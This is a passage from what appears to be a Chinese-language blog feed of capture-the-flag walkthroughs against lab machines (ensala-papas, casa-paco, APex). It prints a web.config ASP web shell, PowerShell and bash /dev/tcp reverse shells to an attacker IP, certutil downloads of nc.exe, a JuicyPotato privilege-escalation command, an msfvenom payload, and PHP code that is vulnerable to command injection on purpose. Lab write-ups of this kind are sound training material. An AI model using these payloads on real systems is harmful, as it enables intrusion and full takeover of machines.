/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/*http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================

```

Êâ´Âà∞‰∏Ä‰∏™`/zoc.aspx`ÔºåÂéªÊµèËßàÂô®Êü•Áúã‰∫Ü‰∏Ä‰∏ãÔºåÊòØ‰∏Ä‰∏™‰∏ä‰º†È°µÔºåÂπ∂Âú®Ê≥®ÈáäÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÁõÆÂΩïË∑ØÂæÑ`/Subiditosdetono/`ÔºåÂΩìÊàë‰ª¨ÊääÁõÆÂΩïÂä†ÂÖ•ÁΩëÂùÄ‰ºöÁúãÂà∞Â¶Ç‰∏ãÂÜÖÂÆπ

![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)

Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Êúâ‰∏Ä‰∏™`config`Êñá‰ª∂ÔºåÂΩìÊàë‰ª¨ÁÇπÂáªÊó∂‰ºöÂèëÁé∞**404**Êó†Ê≥ïËÆøÈóÆÔºåÈÇ£Êàë‰ª¨ËøòÊòØÂõû‰∏ä‰º†È°µËØïËØïËÉΩ‰∏çËÉΩ‰∏ä‰º†**shell**

![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)

‰∏çÂÖÅËÆ∏Êàë‰ª¨‰∏ä‰º†`.aspx`ÂêéÁºÄÁöÑÊñá‰ª∂ÔºåÊ†πÊçÆ‰πãÂâçËÆøÈóÆ`/Subiditosdetono/`ÁúãÂà∞Êúâ`config`Êñá‰ª∂ÔºåÊàë‰ª¨ÂèØ‰ª•‰ªé‰∏≠Áü•ÈÅìÔºåÂèØ‰ª•‰∏ä‰º†`config`Êñá‰ª∂ÔºåÊàë‰ª¨Âéª[hacktricks](https://book.hacktricks.xyz/)ÊêúÁ¥¢‰∏Ä‰∏ãÁúã`config`Êñá‰ª∂ÂèØ‰∏çÂèØ‰ª•ÂÅö`shell`

![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)

ÊâæÂà∞‰∫Ü‰∏ÄÁÇπÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÊàë‰ª¨ÊääÂÆÉÁöÑÁ§∫‰æã[Â§çÂà∂](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)‰∏ãÊù•Ôºå‰∏ä‰º†ËøêË°å

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat web.config 
&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;handlers accessPolicy='Read, Script, Write'&gt;
         &lt;add name='web_config' path='*.config' verb='*' modules='IsapiModule' scriptProcessor='%windir%\system32\inetsrv\asp.dll' resourceType='Unspecified' requireAccess='Write' preCondition='bitness64' /&gt;       
      &lt;/handlers&gt;
      &lt;security&gt;
         &lt;requestFiltering&gt;
            &lt;fileExtensions&gt;
               &lt;remove fileExtension='.config' /&gt;
            &lt;/fileExtensions&gt;
            &lt;hiddenSegments&gt;
               &lt;remove segment='web.config' /&gt;
            &lt;/hiddenSegments&gt;
         &lt;/requestFiltering&gt;
      &lt;/security&gt;
   &lt;/system.webServer&gt;
&lt;/configuration&gt;
&lt;!--
&lt;% Response.write('-'&amp;'-&gt;')%&gt;
&lt;%
Set oScript = Server.CreateObject('WSCRIPT.SHELL')
Set oScriptNet = Server.CreateObject('WSCRIPT.NETWORK')
Set oFileSys = Server.CreateObject('Scripting.FileSystemObject')

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject('WScript.Shell')
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&gt;

&lt;BODY&gt;
&lt;FORM action='' method='GET'&gt;
&lt;input type='text' name='cmd' size=45 value='&lt;%= szCMD %&gt;'&gt;
&lt;input type='submit' value='Run'&gt;
&lt;/FORM&gt;

&lt;PRE&gt;
&lt;%= '\\' &amp; oScriptNet.ComputerName &amp; '\' &amp; oScriptNet.UserName %&gt;
&lt;%Response.Write(Request.ServerVariables('server_name'))%&gt;
&lt;p&gt;
&lt;b&gt;The server's port:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('server_port'))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('server_software'))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables('LOCAL_ADDR'))%&gt;
&lt;% szCMD = request('cmd')
thisDir = getCommandOutput('cmd /c' &amp; szCMD)
Response.Write(thisDir)%&gt;
&lt;/p&gt;
&lt;br&gt;
&lt;/BODY&gt;



&lt;%Response.write('&lt;!-'&amp;'-') %&gt;
--&gt;
        
```

![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)

Âºπ‰∏™**shell**ÂõûÊù•

```bash
powershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#ÊîªÂáªÊú∫
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/netcat]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e\info
```

---

# 3.ÊèêÊùÉ

ÊãøÂà∞**shell**ÂêéÁúãÁúãÊùÉÈôê

```bash
PS C:\users\info&gt; whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado

```

Êàë‰ª¨Êúâ `SeImpersonatePrivilege`ÊùÉÈôêÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî® **[JuicyPotato](https://github.com/ohpe/juicy-potato)** Â∑•ÂÖ∑Êù•ÊèêÂçáÊùÉÈôê„ÄÇ

![image](https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7)

```bash
PS C:\tmp&gt; certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
****  En l?nea  ****
  0000  ...
  e800
CertUtil: -URLCache comando completado correctamente.
PS C:\tmp&gt; dir


    Directorio: C:\tmp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:19      59392 nc.exe                          


PS C:\tmp&gt; certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe
****  En l?nea  ****
  000000  ...
  054e00
CertUtil: -URLCache comando completado correctamente.
PS C:\tmp&gt; dir


    Directorio: C:\tmp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 
-a---        02/01/2025     15:19      59392 nc.exe                          



```

ÂÖàÂ∞Ü`JuicyPotato.exe`Âíå`nc.exe`‰º†‰∏äÁõÆÊ†áÊú∫Âô®

```bash
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a '/c C:\tmp\nc.exe -e cmd 192.168.205.141 4567' -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
```

ËøêË°å`JuicyPotato.exe`

```bash
‚îî‚îÄ$ nc -lvnp 4567    
listening on [any] 4567 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176
Microsoft Windows [VersiÔøΩn 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
C:\Windows\system32&gt;whoami
whoami
nt authority\system

```

ÊàêÂäüÊãøÂà∞**system**ÊùÉÈôê

---

# 4.ÊÄªÁªì

Âú®`BerserkWings`„ÄÅ`ll104567`Â§ß‰Ω¨ÈÇ£Â≠¶‰∫ÜÁÇπÊäÄÊúØ[Á¨ëËÑ∏]

## 4.1 ÂàÜÊûê SMB ÊúçÂä°

**Ê£ÄÊü•Âüü**„ÄÅ**Êìç‰ΩúÁ≥ªÁªüÁâàÊú¨**„ÄÅ**ÊòØÂê¶ÂèØ‰ª•ËÆøÂÆ¢ÁôªÂΩï**Á≠â

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ crackmapexec smb 192.168.205.221
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ netexec smb 192.168.205.221                    
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          
                          
```

ÂàóÂá∫‰∏é **smblcient** ÂÖ±‰∫´ÁöÑÊñá‰ª∂

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbclient -L //192.168.205.221// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available                                                         
```

Ëá™Âä®ÂåñËÑöÊú¨

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbmap -H 192.168.205.221        

    ________  ___      ___  _______   ___      ___       __         _______
   /'       )|'  \    /'  ||   _  '\ |'  \    /'  |     /''\       |   __ '\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /' \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        
[!] Access denied on 192.168.205.221, no fun for you...                                                                
[*] Closed 1 connections                                                                                                   
                                  
```

## 4.2 windowsÂ∏∏Áî®ÂëΩ‰ª§

```bash
# Êü•ÁúãÊìç‰ΩúÁ≥ªÁªü ÔºàOSÔºâ ‰ø°ÊÅØ
systeminfo
# Êü•ÁúãÊã•ÊúâÊùÉÈôê
whoami /priv
# ‰∏ãËΩΩÊîªÂáªÊú∫Êñá‰ª∂
copy \\192.168.205.141\nc.exe .
```

## 4.3 msf

ÁîüÊàê**shell**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Saved as: msf.exe

```

ËøûÊé•**shell**

```bash
msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
```

Ëá™Âä®ÂåñÊºèÊ¥ûÊåñÊéòÔºàË¶ÅÊúâmsfÁöÑshellÔºâ

```bash
msf6 &gt; post/multi/recon/local_exploit_suggester
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_ensala-papas.html</guid><pubDate>Fri, 27 Jun 2025 09:33:53 +0000</pubDate></item><item><title>thl_casa-paco</title><link>https://7r1UMPHK.github.io/post/thl_casa-paco.html</link><description># thl_casa-paco

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)
**ÈöæÂ∫¶**ÔºöÂàùÂ≠¶ËÄÖ
**ÁõÆÊ†á IP**Ôºö192.168.205.137
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
Nmap scan report for 192.168.205.137
Host is up (0.00084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds

```

ÂÖàÁúã**80Á´ØÂè£**Ôºå**22Á´ØÂè£**ÂÄôË°•

# 2.Ë∏©ÁÇπ

![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)

ÊääÂüüÂêçÂä†ÂÖ•`hosts`

![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)

ÊòØ‰∏™ÁÇπÈ§êÁöÑÁΩëÁ´ôÔºå‰Ω†ÊåâÁÖßÂÆÉÁöÑÊèêÁ§∫‰∏ÄÁõ¥ÁÇπÂà∞‰∏ãÂçïÈ°µÔºå‰Ω†ÂèëÁé∞`Plato`ÂèØ‰ª•**ÊâßË°åÂëΩ‰ª§**Ôºå‰ΩÜÊòØÊúâ**ÈôêÂà∂**ÔºåËøû`ls`ÈÉΩÊó†Ê≥ïÊâßË°å,Âπ∂‰∏î**Êó†Ê≥ïÁªïËøá**ÔºåÁàÜÁ†¥‰∏Ä‰∏ãÂèØÊâßË°åÂëΩ‰ª§

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -c -u 'http://casapaco.thl/llevar.php' -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d 'name=a&amp;dish=FUZZ' --hw 89,75
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://casapaco.thl/llevar.php
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000023:   200        32 L     109 W      1276 Ch     'w'                                                                
000000110:   200        36 L     126 W      1478 Ch     'df'                                                               
000000125:   200        33 L     95 W       1184 Ch     'du'                                                               
000000238:   200        31 L     92 W       1202 Ch     'id'                                                               
000000435:   200        50 L     170 W      1814 Ch     'ps'                                                               
000000394:   200        31 L     90 W       1156 Ch     'od'                                                               
000000513:   200        70 L     390 W      5108 Ch     'ss'                                                               
000000601:   200        31 L     93 W       1172 Ch     'wc'                                                               
000000581:   200        32 L     173 W      3792 Ch     'vi'                                                               
000001112:   200        59 L     265 W      2439 Ch     'apt'                                                              
000001160:   200        34 L     110 W      1476 Ch     'arp'                                                              
000002956:   200        31 L     95 W       1215 Ch     'dir'  
ÔºàÁúÅÁï•Ôºâ
```

ÂèëÁé∞ÂèØ‰ª•ÊâßË°å`dir`

![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)

ÂΩì‰Ω†`dir`Ôºå‰Ω†Â∞±‰ºöÂèëÁé∞Êúâ‰∏Ä‰∏™Âè´`llevar1.php`ÁöÑÈ°µÈù¢ÔºàÁàÜÁ†¥‰∏çÂá∫Êù•ÔºåÂè™ÂèØ‰ª•ËøôÊ†∑ÁúãÔºâÔºå‰Ω†ÂèØ‰ª•‰ΩøÁî®`od`Â∑•ÂÖ∑Êü•Áúã‰ªñÊñáÊú¨

![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)

ÊàëÁõ¥Êé•Êîæ**ÂèØËØªÁâàÊú¨**‰∫ÜÔºåÊÉ≥ÁúãÂéüÁâàÁöÑÔºåËá™Â∑±ÊâßË°å‰∏Ä‰∏ã

```bash
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Casa Paco - Para Llevar&lt;/title&gt;
    &lt;link rel='stylesheet' href='static/styles.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;Casa Paco - Pedido para Llevar&lt;/h1&gt;
    &lt;/header&gt;

    &lt;main&gt;
        &lt;h2&gt;Haz tu pedido para llevar&lt;/h2&gt;
        &lt;form action='llevar.php' method='POST' class='order-form'&gt;
            &lt;label for='name'&gt;Nombre:&lt;/label&gt;
            &lt;input type='text' id='name' name='name' placeholder='Tu nombre' required&gt;&lt;br&gt;
          
            &lt;label for='dish'&gt;Plato:&lt;/label&gt;
            &lt;input type='text' id='dish' name='dish' placeholder='Ejemplo: Pizza' required&gt;&lt;br&gt;
          
            &lt;button type='submit' class='btn'&gt;Enviar Pedido&lt;/button&gt;
        &lt;/form&gt;

        &lt;?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $name = htmlspecialchars($_POST['name']); // Sanitizamos para evitar errores visuales
            $dish = $_POST['dish']; // Intencionalmente sin sanitizar para la vulnerabilidad

            // Comando vulnerable
            $output = shell_exec('$dish');

            echo '&lt;section class='confirmation'&gt;';
            echo '&lt;h3&gt;Pedido confirmado&lt;/h3&gt;';
            echo '&lt;p&gt;Gracias, &lt;strong&gt;$name&lt;/strong&gt;. Tu pedido de &lt;strong&gt;$dish&lt;/strong&gt; est√° listo para llevar.&lt;/p&gt;';
            echo '&lt;h3&gt;Salida del Comando:&lt;/h3&gt;';
            echo '&lt;pre&gt;$output&lt;/pre&gt;';
            echo '&lt;/section&gt;';
        }
        ?&gt;
    &lt;/main&gt;

    &lt;footer&gt;
        &lt;p&gt;&amp;copy; 2025 Casa Paco. Todos los derechos reservados.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
```

ÂÆûÁé∞ÁöÑÂíå`llevar.php`‰∏ÄÊ†∑Ôºå‰ΩÜÊòØ‰ªñÊ≤°Êúâ**ÈôêÂà∂**Ôºå‰ΩÜÊòØ‰Ω†‰∏ç**ÈîÅÊ≠ª**Ëøô‰∏™ÁΩëÈ°µÔºå‰ªñÂ∞±‰ºöÊää‰Ω†ÁöÑÂëΩ‰ª§‰∫§Áªô`llevar.php`ÊâßË°åÔºåÂ∞±ÂØÑÂØÑÔºå‰∏ãÈù¢ÊòØ`llevar.php`ÁöÑ‰ª£Á†Å

```bash
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Casa Paco - Pedido para Llevar&lt;/title&gt;
    &lt;link rel='stylesheet' href='static/styles.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;Casa Paco - Pedido para Llevar&lt;/h1&gt;
    &lt;/header&gt;

    &lt;main&gt;
        &lt;h2&gt;Haz tu pedido para llevar&lt;/h2&gt;
        &lt;form action='llevar.php' method='POST' class='order-form'&gt;
            &lt;label for='name'&gt;Nombre:&lt;/label&gt;
            &lt;input type='text' id='name' name='name' placeholder='Tu nombre' required&gt;&lt;br&gt;

            &lt;label for='dish'&gt;Plato:&lt;/label&gt;
            &lt;input type='text' id='dish' name='dish' placeholder='Ejemplo: Cocido' required&gt;&lt;br&gt;

            &lt;button type='submit' class='btn'&gt;Enviar Pedido&lt;/button&gt;
        &lt;/form&gt;
    &lt;/main&gt;

    &lt;?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $name = htmlspecialchars($_POST['name']);
        $dish = $_POST['dish'];

        // Filtrar comandos potencialmente peligrosos
        $blacklist_pattern = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
        if (preg_match($blacklist_pattern, $dish)) {
            die('&lt;p style='color: red;'&gt;Error: Pedido comprometido.&lt;/p&gt;');
        }

        // Permitir solo caracteres v√°lidos
        $allowed_pattern = '/^[a-zA-Z0-9\s\-_\.]+$/';
        if (!preg_match($allowed_pattern, $dish)) {
            die('&lt;p style='color: red;'&gt;Error: Pedido contiene caracteres no permitidos.&lt;/p&gt;');
        }

        // Ejecutar comando (no debe ser usado en un entorno de producci√≥n sin validaciones m√°s estrictas)
        $output = shell_exec($dish);
        echo '&lt;section class='confirmation'&gt;';
        echo '&lt;h3&gt;Pedido confirmado&lt;/h3&gt;';
        echo '&lt;p&gt;Gracias, &lt;strong&gt;$name&lt;/strong&gt;. Tu pedido de &lt;strong&gt;$dish&lt;/strong&gt; estar√° listo para llevar.&lt;/p&gt;';
        echo '&lt;h3&gt;Salida del Comando:&lt;/h3&gt;';
        echo '&lt;pre&gt;$output&lt;/pre&gt;';
        echo '&lt;/section&gt;';
    }
    ?&gt;
  
    &lt;footer&gt;
        &lt;p&gt;&amp;copy; 2025 Casa Paco. Todos los derechos reservados.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;

```

ÈÇ£Â∞±ÁÆÄÂçï‰∫ÜÊàë‰ª¨ÈîÅÊ≠ª`llevar1.php`Êèê‰∫§ÂëΩ‰ª§Â∞±Â•Ω‰∫Ü

![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)

Ë¶ÅËøõË°å**base64ÁªïËøá**Ôºå‰∏çÁÑ∂ÊâßË°å‰∏ç‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                                  
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
bash: cannot set terminal process group (534): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/
www-data@Thehackerslabs-CasaPaco:/home$ ls -la
total 12
drwxr-xr-x  3 root        root        4096 Jan 14 16:52 .
drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
www-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
total 36
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .
drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
#!/bin/bash

# Generar un log de actividad
echo 'Ejecutado por cron el: $(date)' &gt;&gt; /home/pacogerente/log.txt

```

ÂÜô‰∏™ËÑöÊú¨Ë¶ÜÁõñÊéâ`fabada.sh`Â∞±Ë°å‰∫ÜÔºà‰∏çË¶ÅÈóÆÊàë‰∏∫‰ªÄ‰πà‰∏çÁúã`pspy`ÔºåÊàëÁúãÂÆÉÈïøÁöÑÈÉΩÂÉèÂÆöÊó∂‰ªªÂä°‚òù( ‚ó†‚Äø‚ó† )‚òùÔºâ

```bash
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1' &gt; fabada.
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
#!/bin/bash
/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1
```

Á≠â‰∏Ä‰ºöÔºåÂÆÉÂÆöÊó∂Êå∫Âø´ÁöÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8889
listening on [any] 8889 ...
iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
bash: no se puede establecer el grupo de proceso de terminal (4096): Funci√≥n ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@Thehackerslabs-CasaPaco:~# d
id
uid=0(root) gid=0(root) grupos=0(root)

```

‰∏ãÁè≠sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_casa-paco.html</guid><pubDate>Fri, 27 Jun 2025 09:33:50 +0000</pubDate></item><item><title>nyx_APex</title><link>https://7r1UMPHK.github.io/post/nyx_APex.html</link><description># nyx_APex

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[vulnyx - APex](https://vulnyx.com/file/APex.php)
**ÈöæÂ∫¶**ÔºöEasy
**ÁõÆÊ†á IP**Ôºö192.168.205.148
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:17 CST
Nmap scan report for 192.168.205.148
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
MAC Address: 08:00:27:8E:D9:36 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds

```

ÂÖ∂‰∏≠79ÊòØÊàëÊ≤°ÊúâËßÅËøáÁöÑÊúçÂä°Ôºå‰ºòÂÖàÁ∫ßÊúÄÈ´ò

# 2.Ë∏©ÁÇπ

Âú®hacktricksÊêúÁ¥¢Âà∞‰∫ÜÁõ∏ÂÖ≥[ÁΩëÈ°µ](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger)

![Image](https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a)

ÊúâMetasploitÁöÑËÑöÊú¨ÔºåÊàë‰ª¨‰ºòÂÖàÂà©Áî®‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ msfconsole
msf6 &gt; use auxiliary/scanner/finger/finger_users
msf6 auxiliary(scanner/finger/finger_users) &gt; show options 

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                        Required  Description
   ----        ---------------                        --------  -----------
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                                                ploit/basics/using-metasploit.html
   RPORT       79                                     yes       The target port (TCP)
   THREADS     1                                      yes       The number of concurrent threads (max one per host)
